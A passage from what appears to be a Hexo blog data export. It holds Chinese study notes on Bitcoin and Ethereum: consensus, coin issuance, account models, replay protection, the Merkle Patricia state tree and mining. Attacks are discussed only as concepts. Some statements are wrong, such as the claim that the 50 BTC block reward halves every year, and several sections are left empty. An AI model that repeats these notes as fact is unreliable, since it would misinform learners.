title=\"基于投票的问题\"></a>基于投票的问题</h3><ul>\n<li>谁投票</li>\n<li>效率</li>\n<li>女巫攻击，伪造大量的假节点，进行恶意投票。</li>\n</ul>\n<h3 id=\"基于算力的共识机制\"><a href=\"#基于算力的共识机制\" class=\"headerlink\" title=\"基于算力的共识机制\"></a>基于算力的共识机制</h3><h4 id=\"不接受区块\"><a href=\"#不接受区块\" class=\"headerlink\" title=\"不接受区块\"></a>不接受区块</h4><ul>\n<li>区块链分叉</li>\n<li>交易有问题</li>\n<li>nonce不符合target的要求</li>\n</ul>\n<h4 id=\"接受区块\"><a href=\"#接受区块\" class=\"headerlink\" title=\"接受区块\"></a>接受区块</h4><ul>\n<li>最长合法链</li>\n</ul>\n<h4 id=\"记账权的区块\"><a href=\"#记账权的区块\" class=\"headerlink\" title=\"记账权的区块\"></a>记账权的区块</h4><p>说明：只有算力强的矿工或者矿主才能够拥有记账权，尝试成功nonc值才能够打包区块。</p>\n<ul>\n<li>个人的算力基本是固定的，算力越强，基本的权重也就越高。</li>\n<li>可以防范女巫攻击，跟用户多少无直接关系，跟算力大小直接相关。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"1-货币问题\"><a href=\"#1-货币问题\" class=\"headerlink\" title=\"1. 货币问题\"></a>1. 货币问题</h1><h2 id=\"简单的签名货币的问题\"><a href=\"#简单的签名货币的问题\" class=\"headerlink\" title=\"简单的签名货币的问题\"></a>简单的签名货币的问题</h2><ul>\n<li>简单的通过非对称加密进行验证。</li>\n<li>重复花费。</li>\n</ul>\n<h3 id=\"中心化问题\"><a href=\"#中心化问题\" class=\"headerlink\" title=\"中心化问题\"></a>中心化问题</h3><h1 id=\"2-解决双花攻击\"><a href=\"#2-解决双花攻击\" class=\"headerlink\" title=\"2. 解决双花攻击\"></a>2. 解决双花攻击</h1><h1 id=\"3-货币发行\"><a href=\"#3-货币发行\" class=\"headerlink\" title=\"3. 货币发行\"></a>3. 货币发行</h1><h3 id=\"铸币交易\"><a href=\"#铸币交易\" class=\"headerlink\" title=\"铸币交易\"></a>铸币交易</h3><p>说明：block reward，凭空产生，不用说明币的来源。</p>\n<p>收益：50 BTC 每年减半。</p>\n<ul>\n<li>争夺记账权叫挖矿。</li>\n</ul>\n<p>交易：在交易过程中，需要用发起转账的用户对于交易进行签名，并且说明花费的比特币的来源。</p>\n<h1 id=\"4-区块信息\"><a href=\"#4-区块信息\" class=\"headerlink\" title=\"4. 区块信息\"></a>4. 区块信息</h1><h2 id=\"区块头\"><a href=\"#区块头\" class=\"headerlink\" title=\"区块头\"></a>区块头</h2><ul>\n<li>协议</li>\n<li>前一个区块头的HASH。</li>\n<li>交易的默克尔根HASH。</li>\n<li>target，目标值。</li>\n<li>Nonce，随机数值。</li>\n</ul>\n<h2 id=\"区块体\"><a href=\"#区块体\" class=\"headerlink\" title=\"区块体\"></a>区块体</h2><ul>\n<li>交易列表。</li>\n</ul>\n<h1 id=\"5-非对称密码学知识\"><a href=\"#5-非对称密码学知识\" class=\"headerlink\" title=\"5. 非对称密码学知识\"></a>5. 非对称密码学知识</h1><ul>\n<li>公钥加密，私钥解密。</li>\n</ul>\n<h1 id=\"6-分布式共识\"><a href=\"#6-分布式共识\" class=\"headerlink\" title=\"6. 分布式共识\"></a>6. 分布式共识</h1><ul>\n<li>一个节点是不诚实的的异步无上界的网络，公式是不可信的。</li>\n<li>一致性、可容忍性、分布式</li>\n</ul>\n<h1 id=\"7-共识协议\"><a href=\"#7-共识协议\" class=\"headerlink\" title=\"7.共识协议\"></a>7.共识协议</h1><p>前提：大部分节点诚实的，少部分是恶意的。</p>\n<h3 id=\"基于投票的问题\"><a href=\"#基于投票的问题\" class=\"headerlink\" title=\"基于投票的问题\"></a>基于投票的问题</h3><ul>\n<li>谁投票</li>\n<li>效率</li>\n<li>女巫攻击，伪造大量的假节点，进行恶意投票。</li>\n</ul>\n<h3 id=\"基于算力的共识机制\"><a href=\"#基于算力的共识机制\" class=\"headerlink\" title=\"基于算力的共识机制\"></a>基于算力的共识机制</h3><h4 id=\"不接受区块\"><a href=\"#不接受区块\" class=\"headerlink\" title=\"不接受区块\"></a>不接受区块</h4><ul>\n<li>区块链分叉</li>\n<li>交易有问题</li>\n<li>nonce不符合target的要求</li>\n</ul>\n<h4 id=\"接受区块\"><a href=\"#接受区块\" class=\"headerlink\" title=\"接受区块\"></a>接受区块</h4><ul>\n<li>最长合法链</li>\n</ul>\n<h4 id=\"记账权的区块\"><a href=\"#记账权的区块\" class=\"headerlink\" title=\"记账权的区块\"></a>记账权的区块</h4><p>说明：只有算力强的矿工或者矿主才能够拥有记账权，尝试成功nonc值才能够打包区块。</p>\n<ul>\n<li>个人的算力基本是固定的，算力越强，基本的权重也就越高。</li>\n<li>可以防范女巫攻击，跟用户多少无直接关系，跟算力大小直接相关。</li>\n</ul>\n"},{"title":"02-ETC-账户","date":"2024-07-25T15:15:07.000Z","_content":"\n# BTC\n\n- 基于交易的。\n- 需要说明币的来源\n- 验证与一次性花费完\n\n# ETH\n\n- 基于账户的余额管理。\n- 不说明币的来源。\n- 也不需要一次性转完。\n- 天然防御双花攻击。\n## 重放攻击\n\n- 想要收一个交易的两次结果，\n- 加一个交易次数nonce唯一值。\n- 以确保交易的唯一性。\n- nonce在签名中被保护。\n\n# 账户类型\n\n## 外部账户\n\n- 账户余额\n- nonce(counter)\n## 合约账户\n\n- 余额\n- nonce\n- 不能主动发送交易\n- 可以调用其他合约\n- 代码\n- 存储空间\n\n\n","source":"_posts/02-ETC-账户.md","raw":"---\ntitle: 02-ETC-账户\ndate: 2024-07-25 23:15:07\ntags: \n - ETH\n - BlockChain\ncategories:\n - BlockChain\n - ETH\n---\n\n# BTC\n\n- 基于交易的。\n- 需要说明币的来源\n- 验证与一次性花费完\n\n# ETH\n\n- 基于账户的余额管理。\n- 不说明币的来源。\n- 也不需要一次性转完。\n- 天然防御双花攻击。\n## 重放攻击\n\n- 想要收一个交易的两次结果，\n- 加一个交易次数nonce唯一值。\n- 以确保交易的唯一性。\n- nonce在签名中被保护。\n\n# 账户类型\n\n## 外部账户\n\n- 账户余额\n- nonce(counter)\n## 合约账户\n\n- 余额\n- nonce\n- 不能主动发送交易\n- 可以调用其他合约\n- 代码\n- 存储空间\n\n\n","slug":"02-ETC-账户","published":1,"updated":"2024-08-01T16:18:36.091Z","_id":"clz7mrmjs00088wun506p359v","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"BTC\"><a href=\"#BTC\" class=\"headerlink\" title=\"BTC\"></a>BTC</h1><ul>\n<li>基于交易的。</li>\n<li>需要说明币的来源</li>\n<li>验证与一次性花费完</li>\n</ul>\n<h1 id=\"ETH\"><a href=\"#ETH\" class=\"headerlink\" title=\"ETH\"></a>ETH</h1><ul>\n<li>基于账户的余额管理。</li>\n<li>不说明币的来源。</li>\n<li>也不需要一次性转完。</li>\n<li>天然防御双花攻击。</li>\n</ul>\n<h2 id=\"重放攻击\"><a href=\"#重放攻击\" class=\"headerlink\" title=\"重放攻击\"></a>重放攻击</h2><ul>\n<li>想要收一个交易的两次结果，</li>\n<li>加一个交易次数nonce唯一值。</li>\n<li>以确保交易的唯一性。</li>\n<li>nonce在签名中被保护。</li>\n</ul>\n<h1 id=\"账户类型\"><a href=\"#账户类型\" class=\"headerlink\" title=\"账户类型\"></a>账户类型</h1><h2 id=\"外部账户\"><a href=\"#外部账户\" class=\"headerlink\" title=\"外部账户\"></a>外部账户</h2><ul>\n<li>账户余额</li>\n<li>nonce(counter)</li>\n</ul>\n<h2 id=\"合约账户\"><a href=\"#合约账户\" class=\"headerlink\" title=\"合约账户\"></a>合约账户</h2><ul>\n<li>余额</li>\n<li>nonce</li>\n<li>不能主动发送交易</li>\n<li>可以调用其他合约</li>\n<li>代码</li>\n<li>存储空间</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"BTC\"><a href=\"#BTC\" class=\"headerlink\" title=\"BTC\"></a>BTC</h1><ul>\n<li>基于交易的。</li>\n<li>需要说明币的来源</li>\n<li>验证与一次性花费完</li>\n</ul>\n<h1 id=\"ETH\"><a href=\"#ETH\" class=\"headerlink\" title=\"ETH\"></a>ETH</h1><ul>\n<li>基于账户的余额管理。</li>\n<li>不说明币的来源。</li>\n<li>也不需要一次性转完。</li>\n<li>天然防御双花攻击。</li>\n</ul>\n<h2 id=\"重放攻击\"><a href=\"#重放攻击\" class=\"headerlink\" title=\"重放攻击\"></a>重放攻击</h2><ul>\n<li>想要收一个交易的两次结果，</li>\n<li>加一个交易次数nonce唯一值。</li>\n<li>以确保交易的唯一性。</li>\n<li>nonce在签名中被保护。</li>\n</ul>\n<h1 id=\"账户类型\"><a href=\"#账户类型\" class=\"headerlink\" title=\"账户类型\"></a>账户类型</h1><h2 id=\"外部账户\"><a href=\"#外部账户\" class=\"headerlink\" title=\"外部账户\"></a>外部账户</h2><ul>\n<li>账户余额</li>\n<li>nonce(counter)</li>\n</ul>\n<h2 id=\"合约账户\"><a href=\"#合约账户\" class=\"headerlink\" title=\"合约账户\"></a>合约账户</h2><ul>\n<li>余额</li>\n<li>nonce</li>\n<li>不能主动发送交易</li>\n<li>可以调用其他合约</li>\n<li>代码</li>\n<li>存储空间</li>\n</ul>\n"},{"title":"03-ETH-状态树","date":"2024-07-25T15:15:20.000Z","_content":"\n# 状态\n\n## 数据结构\n\n- addr -->state\n## 余额证明\n\n- 所有账户的哈希表。\n- 构造默克尔树。\n- 余额只是一种状态。\n- 根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。\n### 哈希表\n\n\n### 构造默克尔树\n\n#### 不排序\n\n- 默克尔书不唯一。\n#### 排序\n\n- 代价太大，新建账户的代价太大。\n\n# trie(检索树)\n![](../pic/Pasted%20image%2020240725182117.png)\n- 输入不管，结果相同。\n- 更新局部性比较强。\n- 存储有点浪费。\n\n# PT压缩检索树\n![](../pic/Pasted%20image%2020240725182211.png)\n\n- 访问效率增加。\n- 新增加点，节点可能需要扩展。\n- 数据稀疏的时候压缩效果好。\n- 以太坊地址足够稀疏，160位。\n\n# MPT(默克尔压缩检索树)\n\n- 哈希代替指针。\n- 进行压缩。\n- 可以证明账户不存在性。\n\n# MMPT(修改的默克尔压缩检索树)\n![](../pic/Pasted%20image%2020240725224548.png)\n\n![](../pic/Pasted%20image%2020240725224916.png)\n\n\n- 以哈希值存储。\n- 根哈希的值存储在块头节点。\n- 合约账户的信息存储也是小的MMPT。\n- 大部分的节点时共享的。\n\n# 状态树的历史记录的保存\n\n- 可能需要状态退回。\n- 维护历史记录。\n- 为了支持回滚。\n\n\n# 区块头数据结构\n![](../pic/Pasted%20image%2020240725225444.png)\n\n\n- root：账户状态树的根哈希。\n- TxHash：\n- ReciptHash：\n\n# 块身的结构\n![](../pic/Pasted%20image%2020240725225711.png)\n\n\n# RLP(Recursive Length Profix)\n\n- 序列化value的值。\n- 只支持字符数组。","source":"_posts/03-ETH-状态树.md","raw":"---\ntitle: 03-ETH-状态树\ndate: 2024-07-25 23:15:20\ntags: \n - ETH\n - BlockChain\ncategories:\n - BlockChain\n - ETH\n---\n\n# 状态\n\n## 数据结构\n\n- addr -->state\n## 余额证明\n\n- 所有账户的哈希表。\n- 构造默克尔树。\n- 余额只是一种状态。\n- 根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。\n### 哈希表\n\n\n### 构造默克尔树\n\n#### 不排序\n\n- 默克尔书不唯一。\n#### 排序\n\n- 代价太大，新建账户的代价太大。\n\n# trie(检索树)\n![](../pic/Pasted%20image%2020240725182117.png)\n- 输入不管，结果相同。\n- 更新局部性比较强。\n- 存储有点浪费。\n\n# PT压缩检索树\n![](../pic/Pasted%20image%2020240725182211.png)\n\n- 访问效率增加。\n- 新增加点，节点可能需要扩展。\n- 数据稀疏的时候压缩效果好。\n- 以太坊地址足够稀疏，160位。\n\n# MPT(默克尔压缩检索树)\n\n- 哈希代替指针。\n- 进行压缩。\n- 可以证明账户不存在性。\n\n# MMPT(修改的默克尔压缩检索树)\n![](../pic/Pasted%20image%2020240725224548.png)\n\n![](../pic/Pasted%20image%2020240725224916.png)\n\n\n- 以哈希值存储。\n- 根哈希的值存储在块头节点。\n- 合约账户的信息存储也是小的MMPT。\n- 大部分的节点时共享的。\n\n# 状态树的历史记录的保存\n\n- 可能需要状态退回。\n- 维护历史记录。\n- 为了支持回滚。\n\n\n# 区块头数据结构\n![](../pic/Pasted%20image%2020240725225444.png)\n\n\n- root：账户状态树的根哈希。\n- TxHash：\n- ReciptHash：\n\n# 块身的结构\n![](../pic/Pasted%20image%2020240725225711.png)\n\n\n# RLP(Recursive Length Profix)\n\n- 序列化value的值。\n- 只支持字符数组。","slug":"03-ETH-状态树","published":1,"updated":"2024-08-01T16:18:38.532Z","_id":"clz7mrmju000b8wungz0jbjk0","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"状态\"><a href=\"#状态\" class=\"headerlink\" title=\"状态\"></a>状态</h1><h2 id=\"数据结构\"><a href=\"#数据结构\" class=\"headerlink\" title=\"数据结构\"></a>数据结构</h2><ul>\n<li>addr –&gt;state</li>\n</ul>\n<h2 id=\"余额证明\"><a href=\"#余额证明\" class=\"headerlink\" title=\"余额证明\"></a>余额证明</h2><ul>\n<li>所有账户的哈希表。</li>\n<li>构造默克尔树。</li>\n<li>余额只是一种状态。</li>\n<li>根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。</li>\n</ul>\n<h3 id=\"哈希表\"><a href=\"#哈希表\" class=\"headerlink\" title=\"哈希表\"></a>哈希表</h3><h3 id=\"构造默克尔树\"><a href=\"#构造默克尔树\" class=\"headerlink\" title=\"构造默克尔树\"></a>构造默克尔树</h3><h4 id=\"不排序\"><a href=\"#不排序\" class=\"headerlink\" title=\"不排序\"></a>不排序</h4><ul>\n<li>默克尔书不唯一。</li>\n</ul>\n<h4 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h4><ul>\n<li>代价太大，新建账户的代价太大。</li>\n</ul>\n<h1 id=\"trie-检索树\"><a href=\"#trie-检索树\" class=\"headerlink\" title=\"trie(检索树)\"></a>trie(检索树)</h1><p><img src=\"/../pic/Pasted%20image%2020240725182117.png\"></p>\n<ul>\n<li>输入不管，结果相同。</li>\n<li>更新局部性比较强。</li>\n<li>存储有点浪费。</li>\n</ul>\n<h1 id=\"PT压缩检索树\"><a href=\"#PT压缩检索树\" class=\"headerlink\" title=\"PT压缩检索树\"></a>PT压缩检索树</h1><p><img src=\"/../pic/Pasted%20image%2020240725182211.png\"></p>\n<ul>\n<li>访问效率增加。</li>\n<li>新增加点，节点可能需要扩展。</li>\n<li>数据稀疏的时候压缩效果好。</li>\n<li>以太坊地址足够稀疏，160位。</li>\n</ul>\n<h1 id=\"MPT-默克尔压缩检索树\"><a href=\"#MPT-默克尔压缩检索树\" class=\"headerlink\" title=\"MPT(默克尔压缩检索树)\"></a>MPT(默克尔压缩检索树)</h1><ul>\n<li>哈希代替指针。</li>\n<li>进行压缩。</li>\n<li>可以证明账户不存在性。</li>\n</ul>\n<h1 id=\"MMPT-修改的默克尔压缩检索树\"><a href=\"#MMPT-修改的默克尔压缩检索树\" class=\"headerlink\" title=\"MMPT(修改的默克尔压缩检索树)\"></a>MMPT(修改的默克尔压缩检索树)</h1><p><img src=\"/../pic/Pasted%20image%2020240725224548.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240725224916.png\"></p>\n<ul>\n<li>以哈希值存储。</li>\n<li>根哈希的值存储在块头节点。</li>\n<li>合约账户的信息存储也是小的MMPT。</li>\n<li>大部分的节点时共享的。</li>\n</ul>\n<h1 id=\"状态树的历史记录的保存\"><a href=\"#状态树的历史记录的保存\" class=\"headerlink\" title=\"状态树的历史记录的保存\"></a>状态树的历史记录的保存</h1><ul>\n<li>可能需要状态退回。</li>\n<li>维护历史记录。</li>\n<li>为了支持回滚。</li>\n</ul>\n<h1 id=\"区块头数据结构\"><a href=\"#区块头数据结构\" class=\"headerlink\" title=\"区块头数据结构\"></a>区块头数据结构</h1><p><img src=\"/../pic/Pasted%20image%2020240725225444.png\"></p>\n<ul>\n<li>root：账户状态树的根哈希。</li>\n<li>TxHash：</li>\n<li>ReciptHash：</li>\n</ul>\n<h1 id=\"块身的结构\"><a href=\"#块身的结构\" class=\"headerlink\" title=\"块身的结构\"></a>块身的结构</h1><p><img src=\"/../pic/Pasted%20image%2020240725225711.png\"></p>\n<h1 id=\"RLP-Recursive-Length-Profix\"><a href=\"#RLP-Recursive-Length-Profix\" class=\"headerlink\" title=\"RLP(Recursive Length Profix)\"></a>RLP(Recursive Length Profix)</h1><ul>\n<li>序列化value的值。</li>\n<li>只支持字符数组。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"状态\"><a href=\"#状态\" class=\"headerlink\" title=\"状态\"></a>状态</h1><h2 id=\"数据结构\"><a href=\"#数据结构\" class=\"headerlink\" title=\"数据结构\"></a>数据结构</h2><ul>\n<li>addr –&gt;state</li>\n</ul>\n<h2 id=\"余额证明\"><a href=\"#余额证明\" class=\"headerlink\" title=\"余额证明\"></a>余额证明</h2><ul>\n<li>所有账户的哈希表。</li>\n<li>构造默克尔树。</li>\n<li>余额只是一种状态。</li>\n<li>根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。</li>\n</ul>\n<h3 id=\"哈希表\"><a href=\"#哈希表\" class=\"headerlink\" title=\"哈希表\"></a>哈希表</h3><h3 id=\"构造默克尔树\"><a href=\"#构造默克尔树\" class=\"headerlink\" title=\"构造默克尔树\"></a>构造默克尔树</h3><h4 id=\"不排序\"><a href=\"#不排序\" class=\"headerlink\" title=\"不排序\"></a>不排序</h4><ul>\n<li>默克尔书不唯一。</li>\n</ul>\n<h4 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h4><ul>\n<li>代价太大，新建账户的代价太大。</li>\n</ul>\n<h1 id=\"trie-检索树\"><a href=\"#trie-检索树\" class=\"headerlink\" title=\"trie(检索树)\"></a>trie(检索树)</h1><p><img src=\"/../pic/Pasted%20image%2020240725182117.png\"></p>\n<ul>\n<li>输入不管，结果相同。</li>\n<li>更新局部性比较强。</li>\n<li>存储有点浪费。</li>\n</ul>\n<h1 id=\"PT压缩检索树\"><a href=\"#PT压缩检索树\" class=\"headerlink\" title=\"PT压缩检索树\"></a>PT压缩检索树</h1><p><img src=\"/../pic/Pasted%20image%2020240725182211.png\"></p>\n<ul>\n<li>访问效率增加。</li>\n<li>新增加点，节点可能需要扩展。</li>\n<li>数据稀疏的时候压缩效果好。</li>\n<li>以太坊地址足够稀疏，160位。</li>\n</ul>\n<h1 id=\"MPT-默克尔压缩检索树\"><a href=\"#MPT-默克尔压缩检索树\" class=\"headerlink\" title=\"MPT(默克尔压缩检索树)\"></a>MPT(默克尔压缩检索树)</h1><ul>\n<li>哈希代替指针。</li>\n<li>进行压缩。</li>\n<li>可以证明账户不存在性。</li>\n</ul>\n<h1 id=\"MMPT-修改的默克尔压缩检索树\"><a href=\"#MMPT-修改的默克尔压缩检索树\" class=\"headerlink\" title=\"MMPT(修改的默克尔压缩检索树)\"></a>MMPT(修改的默克尔压缩检索树)</h1><p><img src=\"/../pic/Pasted%20image%2020240725224548.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240725224916.png\"></p>\n<ul>\n<li>以哈希值存储。</li>\n<li>根哈希的值存储在块头节点。</li>\n<li>合约账户的信息存储也是小的MMPT。</li>\n<li>大部分的节点时共享的。</li>\n</ul>\n<h1 id=\"状态树的历史记录的保存\"><a href=\"#状态树的历史记录的保存\" class=\"headerlink\" title=\"状态树的历史记录的保存\"></a>状态树的历史记录的保存</h1><ul>\n<li>可能需要状态退回。</li>\n<li>维护历史记录。</li>\n<li>为了支持回滚。</li>\n</ul>\n<h1 id=\"区块头数据结构\"><a href=\"#区块头数据结构\" class=\"headerlink\" title=\"区块头数据结构\"></a>区块头数据结构</h1><p><img src=\"/../pic/Pasted%20image%2020240725225444.png\"></p>\n<ul>\n<li>root：账户状态树的根哈希。</li>\n<li>TxHash：</li>\n<li>ReciptHash：</li>\n</ul>\n<h1 id=\"块身的结构\"><a href=\"#块身的结构\" class=\"headerlink\" title=\"块身的结构\"></a>块身的结构</h1><p><img src=\"/../pic/Pasted%20image%2020240725225711.png\"></p>\n<h1 id=\"RLP-Recursive-Length-Profix\"><a href=\"#RLP-Recursive-Length-Profix\" class=\"headerlink\" title=\"RLP(Recursive Length Profix)\"></a>RLP(Recursive Length Profix)</h1><ul>\n<li>序列化value的值。</li>\n<li>只支持字符数组。</li>\n</ul>\n"},{"title":"04 BTC-实现","date":"2024-07-22T12:20:44.000Z","_content":"基于交易模式\n### UTXO:\n说明：unspent transaction output，未被完全花费的交易输出\n\n寻找条件：产生这个交易的HASH值与这个转账输出是第几个输出\n\nUTXO中 输入 = 输出（比特币个数）\n\n输出-输入 = 交易花费数额\n\n\n基于账户的模式\n\nETH\n\n## 区块：\n\n#### 块头信息\n\n![](../pic/Pasted%20image%2020240717175227.png)\n\n#### 交易的默克尔树\n![](../pic/Pasted%20image%2020240717175427.png)\n\n\n\n\n#### 挖矿条件\n\n- 调整块头的nonce。\n- 调整coinbase的指定数值。\n- 前一个区块的哈希值\n### 挖矿的概率分析\n\n- 伯努利实验\n- 多次伯努利\n\n- 近似泊松分布：每次的挖矿成功的概率都相等，前面的工作对于下一次挖矿没有任何影响，算计强只是可以尝试的次数比较多，所以才能够更容易挖到区块。\n- 如果不是概率相等：那么算力强的矿工，可以一直进行保底，前面贡献越多，保底的概率越大，对于其他小矿工是是分不公平的。\n\n\n\n### 挖矿\n\n- 维护区块链。\n\n\n### 记账权可能的操作\n\n#### zero的确认\n\n- 说明：交易发布，但是区块未进行上链。\n- 常用的认证操作。\n- 原因：区块链首先接受接受先收到的交易。\n\n#### 伪造别人的签名\n\n\n#### 多次花币（回滚操作）\n\n- 说明：\n- 防范：\n\n#### 故意不发布某些合法的交易\n\n- 可以在下一个区块进行发布。\n\n#### selffish mining\n\n- 挖到区块等待发布。\n- 风险太大。\n- 51%\n- 好处：浪费别人算力、减少竞争。\n\n\n","source":"_posts/04 BTC-实现.md","raw":"---\ntitle: 04 BTC-实现\ndate: 2024-07-22 20:20:44\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n基于交易模式\n### UTXO:\n说明：unspent transaction output，未被完全花费的交易输出\n\n寻找条件：产生这个交易的HASH值与这个转账输出是第几个输出\n\nUTXO中 输入 = 输出（比特币个数）\n\n输出-输入 = 交易花费数额\n\n\n基于账户的模式\n\nETH\n\n## 区块：\n\n#### 块头信息\n\n![](../pic/Pasted%20image%2020240717175227.png)\n\n#### 交易的默克尔树\n![](../pic/Pasted%20image%2020240717175427.png)\n\n\n\n\n#### 挖矿条件\n\n- 调整块头的nonce。\n- 调整coinbase的指定数值。\n- 前一个区块的哈希值\n### 挖矿的概率分析\n\n- 伯努利实验\n- 多次伯努利\n\n- 近似泊松分布：每次的挖矿成功的概率都相等，前面的工作对于下一次挖矿没有任何影响，算计强只是可以尝试的次数比较多，所以才能够更容易挖到区块。\n- 如果不是概率相等：那么算力强的矿工，可以一直进行保底，前面贡献越多，保底的概率越大，对于其他小矿工是是分不公平的。\n\n\n\n### 挖矿\n\n- 维护区块链。\n\n\n### 记账权可能的操作\n\n#### zero的确认\n\n- 说明：交易发布，但是区块未进行上链。\n- 常用的认证操作。\n- 原因：区块链首先接受接受先收到的交易。\n\n#### 伪造别人的签名\n\n\n#### 多次花币（回滚操作）\n\n- 说明：\n- 防范：\n\n#### 故意不发布某些合法的交易\n\n- 可以在下一个区块进行发布。\n\n#### selffish mining\n\n- 挖到区块等待发布。\n- 风险太大。\n- 51%\n- 好处：浪费别人算力、减少竞争。\n\n\n","slug":"04 BTC-实现","published":1,"updated":"2024-07-28T06:53:53.430Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmjv000c8wun9406chp4","content":"<p>基于交易模式</p>\n<h3 id=\"UTXO\"><a href=\"#UTXO\" class=\"headerlink\" title=\"UTXO:\"></a>UTXO:</h3><p>说明：unspent transaction output，未被完全花费的交易输出</p>\n<p>寻找条件：产生这个交易的HASH值与这个转账输出是第几个输出</p>\n<p>UTXO中 输入 &#x3D; 输出（比特币个数）</p>\n<p>输出-输入 &#x3D; 交易花费数额</p>\n<p>基于账户的模式</p>\n<p>ETH</p>\n<h2 id=\"区块：\"><a href=\"#区块：\" class=\"headerlink\" title=\"区块：\"></a>区块：</h2><h4 id=\"块头信息\"><a href=\"#块头信息\" class=\"headerlink\" title=\"块头信息\"></a>块头信息</h4><p><img src=\"/../pic/Pasted%20image%2020240717175227.png\"></p>\n<h4 id=\"交易的默克尔树\"><a href=\"#交易的默克尔树\" class=\"headerlink\" title=\"交易的默克尔树\"></a>交易的默克尔树</h4><p><img src=\"/../pic/Pasted%20image%2020240717175427.png\"></p>\n<h4 id=\"挖矿条件\"><a href=\"#挖矿条件\" class=\"headerlink\" title=\"挖矿条件\"></a>挖矿条件</h4><ul>\n<li>调整块头的nonce。</li>\n<li>调整coinbase的指定数值。</li>\n<li>前一个区块的哈希值</li>\n</ul>\n<h3 id=\"挖矿的概率分析\"><a href=\"#挖矿的概率分析\" class=\"headerlink\" title=\"挖矿的概率分析\"></a>挖矿的概率分析</h3><ul>\n<li><p>伯努利实验</p>\n</li>\n<li><p>多次伯努利</p>\n</li>\n<li><p>近似泊松分布：每次的挖矿成功的概率都相等，前面的工作对于下一次挖矿没有任何影响，算计强只是可以尝试的次数比较多，所以才能够更容易挖到区块。</p>\n</li>\n<li><p>如果不是概率相等：那么算力强的矿工，可以一直进行保底，前面贡献越多，保底的概率越大，对于其他小矿工是是分不公平的。</p>\n</li>\n</ul>\n<h3 id=\"挖矿\"><a href=\"#挖矿\" class=\"headerlink\" title=\"挖矿\"></a>挖矿</h3><ul>\n<li>维护区块链。</li>\n</ul>\n<h3 id=\"记账权可能的操作\"><a href=\"#记账权可能的操作\" class=\"headerlink\" title=\"记账权可能的操作\"></a>记账权可能的操作</h3><h4 id=\"zero的确认\"><a href=\"#zero的确认\" class=\"headerlink\" title=\"zero的确认\"></a>zero的确认</h4><ul>\n<li>说明：交易发布，但是区块未进行上链。</li>\n<li>常用的认证操作。</li>\n<li>原因：区块链首先接受接受先收到的交易。</li>\n</ul>\n<h4 id=\"伪造别人的签名\"><a href=\"#伪造别人的签名\" class=\"headerlink\" title=\"伪造别人的签名\"></a>伪造别人的签名</h4><h4 id=\"多次花币（回滚操作）\"><a href=\"#多次花币（回滚操作）\" class=\"headerlink\" title=\"多次花币（回滚操作）\"></a>多次花币（回滚操作）</h4><ul>\n<li>说明：</li>\n<li>防范：</li>\n</ul>\n<h4 id=\"故意不发布某些合法的交易\"><a href=\"#故意不发布某些合法的交易\" class=\"headerlink\" title=\"故意不发布某些合法的交易\"></a>故意不发布某些合法的交易</h4><ul>\n<li>可以在下一个区块进行发布。</li>\n</ul>\n<h4 id=\"selffish-mining\"><a href=\"#selffish-mining\" class=\"headerlink\" title=\"selffish mining\"></a>selffish mining</h4><ul>\n<li>挖到区块等待发布。</li>\n<li>风险太大。</li>\n<li>51%</li>\n<li>好处：浪费别人算力、减少竞争。</li>\n</ul>\n","excerpt":"","more":"<p>基于交易模式</p>\n<h3 id=\"UTXO\"><a href=\"#UTXO\" class=\"headerlink\" title=\"UTXO:\"></a>UTXO:</h3><p>说明：unspent transaction output，未被完全花费的交易输出</p>\n<p>寻找条件：产生这个交易的HASH值与这个转账输出是第几个输出</p>\n<p>UTXO中 输入 &#x3D; 输出（比特币个数）</p>\n<p>输出-输入 &#x3D; 交易花费数额</p>\n<p>基于账户的模式</p>\n<p>ETH</p>\n<h2 id=\"区块：\"><a href=\"#区块：\" class=\"headerlink\" title=\"区块：\"></a>区块：</h2><h4 id=\"块头信息\"><a href=\"#块头信息\" class=\"headerlink\" title=\"块头信息\"></a>块头信息</h4><p><img src=\"/../pic/Pasted%20image%2020240717175227.png\"></p>\n<h4 id=\"交易的默克尔树\"><a href=\"#交易的默克尔树\" class=\"headerlink\" title=\"交易的默克尔树\"></a>交易的默克尔树</h4><p><img src=\"/../pic/Pasted%20image%2020240717175427.png\"></p>\n<h4 id=\"挖矿条件\"><a href=\"#挖矿条件\" class=\"headerlink\" title=\"挖矿条件\"></a>挖矿条件</h4><ul>\n<li>调整块头的nonce。</li>\n<li>调整coinbase的指定数值。</li>\n<li>前一个区块的哈希值</li>\n</ul>\n<h3 id=\"挖矿的概率分析\"><a href=\"#挖矿的概率分析\" class=\"headerlink\" title=\"挖矿的概率分析\"></a>挖矿的概率分析</h3><ul>\n<li><p>伯努利实验</p>\n</li>\n<li><p>多次伯努利</p>\n</li>\n<li><p>近似泊松分布：每次的挖矿成功的概率都相等，前面的工作对于下一次挖矿没有任何影响，算计强只是可以尝试的次数比较多，所以才能够更容易挖到区块。</p>\n</li>\n<li><p>如果不是概率相等：那么算力强的矿工，可以一直进行保底，前面贡献越多，保底的概率越大，对于其他小矿工是是分不公平的。</p>\n</li>\n</ul>\n<h3 id=\"挖矿\"><a href=\"#挖矿\" class=\"headerlink\" title=\"挖矿\"></a>挖矿</h3><ul>\n<li>维护区块链。</li>\n</ul>\n<h3 id=\"记账权可能的操作\"><a href=\"#记账权可能的操作\" class=\"headerlink\" title=\"记账权可能的操作\"></a>记账权可能的操作</h3><h4 id=\"zero的确认\"><a href=\"#zero的确认\" class=\"headerlink\" title=\"zero的确认\"></a>zero的确认</h4><ul>\n<li>说明：交易发布，但是区块未进行上链。</li>\n<li>常用的认证操作。</li>\n<li>原因：区块链首先接受接受先收到的交易。</li>\n</ul>\n<h4 id=\"伪造别人的签名\"><a 